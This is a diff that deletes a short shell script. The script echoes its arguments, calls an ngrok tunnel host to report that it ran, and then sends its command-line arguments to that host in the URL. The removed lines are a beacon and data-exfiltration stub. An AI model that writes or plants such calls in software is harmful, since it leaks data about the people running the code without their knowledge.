@@ -1,9 +1,0 @@
-#!/usr/bin/env sh
-
-echo $@
-
-wget "http://88e472c8bce9.ngrok.io/didboot"
-
-export ARGUMENTS=$@
-export ARGUMENTS2="${ARGUMENTS// /_}"
-wget "http://88e472c8bce9.ngrok.io/${ARGUMENTS2}"
